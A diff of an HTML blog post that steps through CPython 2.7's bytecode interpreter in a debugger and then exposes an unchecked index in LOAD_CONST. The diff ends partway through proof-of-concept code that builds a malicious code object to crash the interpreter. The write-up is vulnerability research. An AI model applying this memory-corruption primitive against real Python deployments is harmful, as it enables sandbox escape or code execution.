-1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c
-
-0:000&amp;gt; db ecx l8
-025ea914  7c 00 00 7c 01 00 17 53                          |..|...S
-</pre></div>
-
-
-<p>OK perfect, we are in the middle of the VM, and our function is being evaluated. The register <em>ECX</em> points to the bytecode being evaluated, and the first opcode is <em>LOAD_FAST</em>.</p>
-<p>Basically, this opcode takes an object in the <em>fastlocals</em> array, and push it on the virtual stack. In our case, as we saw in both the disassembly and the bytecode dump, we are going to load the index 0 (the argument <em>b</em>), then the index 1 (argument <em>c</em>).</p>
-<p>Here's what it looks like in the debugger ; first step is to load the <em>LOAD_FAST</em> opcode:</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt;
-eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
-eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
-python27!PyEval_EvalFrameEx+0x2b2:
-1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c
-</pre></div>
-
-
-<p>In <em>ECX</em> we have a pointer onto the opcodes of the function being evaluated, our dummy function. <em>0x7c</em> is the value of the <em>LOAD_FAST</em> opcode as we can see:</p>
-<div class="highlight"><pre><span></span><span class="cp">#define LOAD_FAST 124 </span><span class="cm">/* Local variable number */</span><span class="cp"></span>
-</pre></div>
-
-
-<p>Then, the function needs to check if the opcode has argument or not, and that's done by comparing the opcode with a constant value called <em>HAVE_ARGUMENT</em>:</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt;
-eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
-eip=1e0ec568 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
-python27!PyEval_EvalFrameEx+0x2b8:
-1e0ec568 83f85a          cmp     eax,5Ah
-</pre></div>
-
-
-<p>Again, we can verify the value to be sure we understand what we are doing:</p>
-<div class="highlight"><pre><span></span><span class="n">In</span> <span class="p">[</span><span class="mi">11</span><span class="p">]:</span> <span class="s1">&#39;</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">opcode</span><span class="o">.</span><span class="n">HAVE_ARGUMENT</span>
-<span class="n">Out</span><span class="p">[</span><span class="mi">11</span><span class="p">]:</span> <span class="s1">&#39;5a&#39;</span>
-</pre></div>
-
-
-<p>Definition of <code>HAS_ARG</code> in C:</p>
-<div class="highlight"><pre><span></span><span class="cp">#define HAS_ARG(op) ((op) &amp;gt;= HAVE_ARGUMENT)</span>
-</pre></div>
-
-
-<p>If the opcode has an argument, the function needs to retrieve it (it's one byte):</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt;
-eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
-eip=1e0ec571 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl nz na pe nc
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200206
-python27!PyEval_EvalFrameEx+0x2c1:
-1e0ec571 0fb67901        movzx   edi,byte ptr [ecx+1]       ds:002b:025ea916=00
-</pre></div>
-
-
-<p>As expected for the first <em>LOAD_FAST</em> the argument is <em>0x00</em>, perfect.
-After that the function dispatches the execution flow to the <em>LOAD_FAST</em> case defined as follow:</p>
-<div class="highlight"><pre><span></span><span class="cp">#define GETLOCAL(i)     (fastlocals[i])</span>
-<span class="cp">#define Py_INCREF(op) (                         \</span>
-<span class="cp">    _Py_INC_REFTOTAL  _Py_REF_DEBUG_COMMA       \</span>
-<span class="cp">    ((PyObject*)(op))-&amp;gt;ob_refcnt++)</span>
-<span class="cp">#define PUSH(v)                BASIC_PUSH(v)</span>
-<span class="cp">#define BASIC_PUSH(v)     (*stack_pointer++ = (v))</span>
-
-<span class="k">case</span> <span class="nl">LOAD_FAST</span><span class="p">:</span>
-  <span class="n">x</span> <span class="o">=</span> <span class="n">GETLOCAL</span><span class="p">(</span><span class="n">oparg</span><span class="p">);</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
-    <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
-    <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
-  <span class="p">}</span>
-  <span class="c1">//...</span>
-  <span class="k">break</span><span class="p">;</span>
 </pre></div>
 
 
 <p>Let's see what it looks like in assembly:</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt;
-eax=0000007c ebx=00000000 ecx=0000007b edx=00000059 esi=1e222c0c edi=00000000
-eip=1e0ec5cf esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
-python27!PyEval_EvalFrameEx+0x31f:
-1e0ec5cf 8b54246c        mov     edx,dword ptr [esp+6Ch] ss:002b:0027fd44=98ef6b02
+<div class="highlight"><pre><span></span>Loads the fastlocals array (026bef98)
+    0:000&gt;
+    eax=0000007c ebx=00000000 ecx=0000007b edx=00000059 esi=1e222c0c edi=00000000
+    eip=1e0ec5cf esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
+    python27!PyEval_EvalFrameEx+0x31f:
+    1e0ec5cf 8b54246c        mov     edx,dword ptr [esp+6Ch] ss:002b:0027fd44=98ef6b02
 </pre></div>
 
 
 <p>After getting the <em>fastlocals</em>, we can retrieve an entry:</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt;
-eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=1e222c0c edi=00000000
-eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
-python27!PyEval_EvalFrameEx+0x323:
-1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d0=a0aa5e02
+<div class="highlight"><pre><span></span>Retrieve the entry 0 of the fastlocals array
+    0:000&gt;
+    eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=1e222c0c edi=00000000
+    eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
+    python27!PyEval_EvalFrameEx+0x323:
+    1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d0=a0aa5e02
 </pre></div>
 
 
 <p>Also keep in mind we called our dummy function with two strings, so let's actually check it is a string object:</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt; dps 025eaaa0 l2
-025eaaa0  00000004
-025eaaa4  1e226798 python27!PyString_Type
+<div class="highlight"><pre><span></span>Type checking
+    0:000&gt; dps 025eaaa0 l2
+    025eaaa0  00000004
+    025eaaa4  1e226798 python27!PyString_Type
 </pre></div>
 
 
 <p>Perfect, now according to the definition of <em>PyStringObject</em>:</p>
-<div class="highlight"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
-    <span class="n">PyObject_VAR_HEAD</span>
-    <span class="kt">long</span> <span class="n">ob_shash</span><span class="p">;</span>
-    <span class="kt">int</span> <span class="n">ob_sstate</span><span class="p">;</span>
-    <span class="kt">char</span> <span class="n">ob_sval</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
-<span class="p">}</span> <span class="n">PyStringObject</span><span class="p">;</span>
+<div class="highlight"><pre><span></span><span class="n">PyStringObject</span>
+    <span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+        <span class="n">PyObject_VAR_HEAD</span>
+        <span class="kt">long</span> <span class="n">ob_shash</span><span class="p">;</span>
+        <span class="kt">int</span> <span class="n">ob_sstate</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">ob_sval</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="p">}</span> <span class="n">PyStringObject</span><span class="p">;</span>
 </pre></div>
 
 
 <p>We should find the content of the string directly in the object:</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt; db 025eaaa0 l1f
-025eaaa0  04 00 00 00 98 67 22 1e-05 00 00 00 dd 16 30 43  .....g&quot;.......0C
-025eaab0  01 00 00 00 48 65 6c 6c-6f 00 00 00 ff ff ff     ....Hello......
+<div class="highlight"><pre><span></span>Finding the string in the PyStringObject
+    0:000&gt; db 025eaaa0 l1f
+    025eaaa0  04 00 00 00 98 67 22 1e-05 00 00 00 dd 16 30 43  .....g&quot;.......0C
+    025eaab0  01 00 00 00 48 65 6c 6c-6f 00 00 00 ff ff ff     ....Hello......
 </pre></div>
 
 
 <p>Awesome, we have the size of the string at the offset <em>0x8</em>, and the actual string is at <em>0x14</em>.</p>
 <p>Let's move on to the second opcode now, this time with less details though:</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt; 
-eax=0000007c ebx=00000000 ecx=025ea917 edx=026bef98 esi=025eaaa0 edi=00000000
-eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
-python27!PyEval_EvalFrameEx+0x2b2:
-1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea917=7c
+<div class="highlight"><pre><span></span>Fetching the second LOAD_FAST opcode
+    0:000&gt; 
+    eax=0000007c ebx=00000000 ecx=025ea917 edx=026bef98 esi=025eaaa0 edi=00000000
+    eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+    python27!PyEval_EvalFrameEx+0x2b2:
+    1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea917=7c
 </pre></div>
 
 
 <p>This time, we are loading the second argument, so the index 1 of <em>fastlocals</em>.
 We can type-check the object and dump the string stored in it:</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt; 
-eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=025eaaa0 edi=00000001
-eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei ng nz na po cy
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
-python27!PyEval_EvalFrameEx+0x323:
-1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d4=c0af5e02
-0:000&amp;gt; db poi(026bf0d4) l1f
-025eafc0  04 00 00 00 98 67 22 1e-05 00 00 00 39 4a 25 29  .....g&quot;.....9J%)
-025eafd0  01 00 00 00 57 6f 72 6c-64 00 5e 02 79 00 00     ....World.^.y..
+<div class="highlight"><pre><span></span>Retrieving the index 1 of fastlocals (025ea9c0)
+    0:000&gt; 
+    eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=025eaaa0 edi=00000001
+    eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei ng nz na po cy
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
+    python27!PyEval_EvalFrameEx+0x323:
+    1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d4=c0af5e02
+    0:000&gt; db poi(026bf0d4) l1f
+    025eafc0  04 00 00 00 98 67 22 1e-05 00 00 00 39 4a 25 29  .....g&quot;.....9J%)
+    025eafd0  01 00 00 00 57 6f 72 6c-64 00 5e 02 79 00 00     ....World.^.y..
 </pre></div>
 
 
 <p>Comes now the <em>BINARY_ADD</em> opcode:</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt; 
-eax=0000007c ebx=00000000 ecx=025ea91a edx=026bef98 esi=025eafc0 edi=00000001
-eip=1e0ec562 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei pl zr na pe nc
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
-python27!PyEval_EvalFrameEx+0x2b2:
-1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91a=17
+<div class="highlight"><pre><span></span>Fetching the BINARY_ADD opcode
+    0:000&gt; 
+    eax=0000007c ebx=00000000 ecx=025ea91a edx=026bef98 esi=025eafc0 edi=00000001
+    eip=1e0ec562 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei pl zr na pe nc
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+    python27!PyEval_EvalFrameEx+0x2b2:
+    1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91a=17
 </pre></div>
 
 
 <p>Here it's supposed to retrieve the two objects on the top-of-stack, and add them.
 The C code looks like this:</p>
-<div class="highlight"><pre><span></span><span class="cp">#define SET_TOP(v)        (stack_pointer[-1] = (v))</span>
+<div class="highlight"><pre><span></span><span class="n">BINARY_ADD</span>
+    <span class="cp">#define SET_TOP(v)        (stack_pointer[-1] = (v))</span>
 
-<span class="k">case</span> <span class="nl">BINARY_ADD</span><span class="p">:</span>
-  <span class="n">w</span> <span class="o">=</span> <span class="n">POP</span><span class="p">();</span>
-  <span class="n">v</span> <span class="o">=</span> <span class="n">TOP</span><span class="p">();</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">PyInt_CheckExact</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">PyInt_CheckExact</span><span class="p">(</span><span class="n">w</span><span class="p">))</span> <span class="p">{</span>
-    <span class="c1">// Not our case</span>
-  <span class="p">}</span>
-  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">PyString_CheckExact</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span>
-           <span class="n">PyString_CheckExact</span><span class="p">(</span><span class="n">w</span><span class="p">))</span> <span class="p">{</span>
-      <span class="n">x</span> <span class="o">=</span> <span class="n">string_concatenate</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">next_instr</span><span class="p">);</span>
-      <span class="cm">/* string_concatenate consumed the ref to v */</span>
-      <span class="k">goto</span> <span class="n">skip_decref_vx</span><span class="p">;</span>
-  <span class="p">}</span>
-  <span class="k">else</span> <span class="p">{</span>
-    <span class="c1">// Not our case</span>
-  <span class="p">}</span>
-  <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">v</span><span class="p">);</span>
-<span class="nl">skip_decref_vx</span><span class="p">:</span>
-  <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">w</span><span class="p">);</span>
-  <span class="n">SET_TOP</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
-  <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="nl">BINARY_ADD</span><span class="p">:</span>
+      <span class="n">w</span> <span class="o">=</span> <span class="n">POP</span><span class="p">();</span>
+      <span class="n">v</span> <span class="o">=</span> <span class="n">TOP</span><span class="p">();</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">PyInt_CheckExact</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">PyInt_CheckExact</span><span class="p">(</span><span class="n">w</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// Not our case</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">PyString_CheckExact</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+               <span class="n">PyString_CheckExact</span><span class="p">(</span><span class="n">w</span><span class="p">))</span> <span class="p">{</span>
+          <span class="n">x</span> <span class="o">=</span> <span class="n">string_concatenate</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">next_instr</span><span class="p">);</span>
+          <span class="cm">/* string_concatenate consumed the ref to v */</span>
+          <span class="k">goto</span> <span class="n">skip_decref_vx</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+        <span class="c1">// Not our case</span>
+      <span class="p">}</span>
+      <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">v</span><span class="p">);</span>
+    <span class="nl">skip_decref_vx</span><span class="p">:</span>
+      <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">w</span><span class="p">);</span>
+      <span class="n">SET_TOP</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+      <span class="k">break</span><span class="p">;</span>
 </pre></div>
 
 
 <p>And here is the assembly version where it retrieves the two objects from the top-of-stack:</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt; 
-eax=00000017 ebx=00000000 ecx=00000016 edx=0000000f esi=025eafc0 edi=00000000
-eip=1e0eccf5 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
-python27!PyEval_EvalFrameEx+0xa45:
-1e0eccf5 8b75f8          mov     esi,dword ptr [ebp-8] ss:002b:026bf0d8=a0aa5e02
-...
-0:000&amp;gt; 
-eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=00000000
-eip=1e0eccfb esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
-python27!PyEval_EvalFrameEx+0xa4b:
-1e0eccfb 8b7dfc          mov     edi,dword ptr [ebp-4] ss:002b:026bf0dc=c0af5e02
-0:000&amp;gt; 
-eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=025eafc0
-eip=1e0eccfe esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
-python27!PyEval_EvalFrameEx+0xa4e:
-1e0eccfe 83ed04          sub     ebp,4
+<div class="highlight"><pre><span></span>POP and TOP
+    0:000&gt; 
+    eax=00000017 ebx=00000000 ecx=00000016 edx=0000000f esi=025eafc0 edi=00000000
+    eip=1e0eccf5 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
+    python27!PyEval_EvalFrameEx+0xa45:
+    1e0eccf5 8b75f8          mov     esi,dword ptr [ebp-8] ss:002b:026bf0d8=a0aa5e02
+    ...
+    0:000&gt; 
+    eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=00000000
+    eip=1e0eccfb esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
+    python27!PyEval_EvalFrameEx+0xa4b:
+    1e0eccfb 8b7dfc          mov     edi,dword ptr [ebp-4] ss:002b:026bf0dc=c0af5e02
+    0:000&gt; 
+    eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=025eafc0
+    eip=1e0eccfe esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
+    python27!PyEval_EvalFrameEx+0xa4e:
+    1e0eccfe 83ed04          sub     ebp,4
 </pre></div>
 
 
 <p>A bit further we have our string concatenation:</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt; 
-eax=025eafc0 ebx=00000000 ecx=0027fcd0 edx=026bef98 esi=025eaaa0 edi=025eafc0
-eip=1e0eb733 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
-python27!PyEval_SliceIndex+0x813:
-1e0eb733 e83881fcff      call    python27!PyString_Concat (1e0b3870)
-0:000&amp;gt; dd esp l3
-0027fcb8  0027fcd0 025eafc0 025eaaa0
-0:000&amp;gt; p
-eax=025eaaa0 ebx=00000000 ecx=00000064 edx=000004fb esi=025eaaa0 edi=025eafc0
-eip=1e0eb738 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
-python27!PyEval_SliceIndex+0x818:
-1e0eb738 8b442418        mov     eax,dword ptr [esp+18h] ss:002b:0027fcd0=c0aa5e02
-0:000&amp;gt; db poi(0027fcd0) l1f
-025eaac0  01 00 00 00 98 67 22 1e-0a 00 00 00 ff ff ff ff  .....g&quot;.........
-025eaad0  00 00 00 00 48 65 6c 6c-6f 57 6f 72 6c 64 00     ....HelloWorld.
+<div class="highlight"><pre><span></span> String concatenation in string_concatenate
+    0:000&gt; 
+    eax=025eafc0 ebx=00000000 ecx=0027fcd0 edx=026bef98 esi=025eaaa0 edi=025eafc0
+    eip=1e0eb733 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
+    python27!PyEval_SliceIndex+0x813:
+    1e0eb733 e83881fcff      call    python27!PyString_Concat (1e0b3870)
+    0:000&gt; dd esp l3
+    0027fcb8  0027fcd0 025eafc0 025eaaa0
+    0:000&gt; p
+    eax=025eaaa0 ebx=00000000 ecx=00000064 edx=000004fb esi=025eaaa0 edi=025eafc0
+    eip=1e0eb738 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
+    python27!PyEval_SliceIndex+0x818:
+    1e0eb738 8b442418        mov     eax,dword ptr [esp+18h] ss:002b:0027fcd0=c0aa5e02
+    0:000&gt; db poi(0027fcd0) l1f
+    025eaac0  01 00 00 00 98 67 22 1e-0a 00 00 00 ff ff ff ff  .....g&quot;.........
+    025eaad0  00 00 00 00 48 65 6c 6c-6f 57 6f 72 6c 64 00     ....HelloWorld.
 </pre></div>
 
 
 <p>And the last part of the case is to push the resulting string onto the virtual stack (<em>SET_TOP</em> operation):</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt; 
-eax=025eaac0 ebx=025eaac0 ecx=00000005 edx=000004fb esi=025eaaa0 edi=025eafc0
-eip=1e0ecb82 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl nz ac po cy
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200213
-python27!PyEval_EvalFrameEx+0x8d2:
-1e0ecb82 895dfc          mov     dword ptr [ebp-4],ebx ss:002b:026bf0d8=a0aa5e02
+<div class="highlight"><pre><span></span>Push the resulting object onto the virtual stack
+    0:000&gt; 
+    eax=025eaac0 ebx=025eaac0 ecx=00000005 edx=000004fb esi=025eaaa0 edi=025eafc0
+    eip=1e0ecb82 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl nz ac po cy
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200213
+    python27!PyEval_EvalFrameEx+0x8d2:
+    1e0ecb82 895dfc          mov     dword ptr [ebp-4],ebx ss:002b:026bf0d8=a0aa5e02
 </pre></div>
 
 
 <p>Last part of our deep dive, the <em>RETURN_VALUE</em> opcode:</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt; 
-eax=025eaac0 ebx=025eafc0 ecx=025ea91b edx=026bef98 esi=025eaac0 edi=025eafc0
-eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
-python27!PyEval_EvalFrameEx+0x2b2:
-1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91b=53
+<div class="highlight"><pre><span></span>Fetching the RETURN_VALUE opcode
+    0:000&gt; 
+    eax=025eaac0 ebx=025eafc0 ecx=025ea91b edx=026bef98 esi=025eaac0 edi=025eafc0
+    eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+    python27!PyEval_EvalFrameEx+0x2b2:
+    1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91b=53
 </pre></div>
 
 
@@ -621,46 +651,49 @@ python27!PyEval_EvalFrameEx+0x2b2:
 <p>Note that I would love very much to have a debugger at the Python bytecode level, it would be much easier than instrumenting the interpreter. If you know one ping me! If you build one ping me too :-).</p>
 <h1 id="the-bug">The bug</h1>
 <p>Here is the bug, spot it and give it some love:</p>
-<div class="highlight"><pre><span></span><span class="cp">#ifndef Py_DEBUG</span>
-<span class="cp">#define GETITEM(v, i) PyTuple_GET_ITEM((PyTupleObject *)(v), (i))</span>
-<span class="cp">#else</span>
-<span class="c1">//...</span>
-<span class="cm">/* Macro, trading safety for speed &amp;lt;-- LOL, :) */</span> 
-<span class="cp">#define PyTuple_GET_ITEM(op, i) (((PyTupleObject *)(op))-&amp;gt;ob_item[i])</span>
+<div class="highlight"><pre><span></span><span class="n">LOAD_CONST</span> <span class="n">bug</span>
+    <span class="cp">#ifndef Py_DEBUG</span>
+    <span class="cp">#define GETITEM(v, i) PyTuple_GET_ITEM((PyTupleObject *)(v), (i))</span>
+    <span class="cp">#else</span>
+    <span class="c1">//...</span>
+    <span class="cm">/* Macro, trading safety for speed &lt;-- LOL, :) */</span> 
+    <span class="cp">#define PyTuple_GET_ITEM(op, i) (((PyTupleObject *)(op))-&gt;ob_item[i])</span>
 
-<span class="k">case</span> <span class="nl">LOAD_CONST</span><span class="p">:</span>
-  <span class="n">x</span> <span class="o">=</span> <span class="n">GETITEM</span><span class="p">(</span><span class="n">consts</span><span class="p">,</span> <span class="n">oparg</span><span class="p">);</span>
-  <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
-  <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
-  <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
+    <span class="k">case</span> <span class="nl">LOAD_CONST</span><span class="p">:</span>
+      <span class="n">x</span> <span class="o">=</span> <span class="n">GETITEM</span><span class="p">(</span><span class="n">consts</span><span class="p">,</span> <span class="n">oparg</span><span class="p">);</span>
+      <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
+      <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
+      <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
 </pre></div>
 
 
 <p>This may be a bit obscure for you, but keep in mind we control the index <em>oparg</em> and the content of <em>consts</em>. That means we can just push <em>untrusted</em> data on the virtual stack of the VM: brilliant. Getting a crash out of this bug is fairly easy, try to run these lines (on a Python 2.7 distribution):</p>
-<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">opcode</span>
-<span class="kn">import</span> <span class="nn">types</span>
+<div class="highlight"><pre><span></span><span class="n">craaaaash</span>
+    <span class="kn">import</span> <span class="nn">opcode</span>
+    <span class="kn">import</span> <span class="nn">types</span>
 
-<span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
-  <span class="k">pass</span>
+    <span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
+      <span class="k">pass</span>
 
-<span class="n">a</span><span class="o">.</span><span class="n">func_code</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span>
-  <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
-  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;EXTENDED_ARG&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\xef\xbe</span><span class="s1">&#39;</span> <span class="o">+</span>
-  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;LOAD_CONST&#39;</span><span class="p">])</span>   <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\xad\xde</span><span class="s1">&#39;</span><span class="p">,</span>
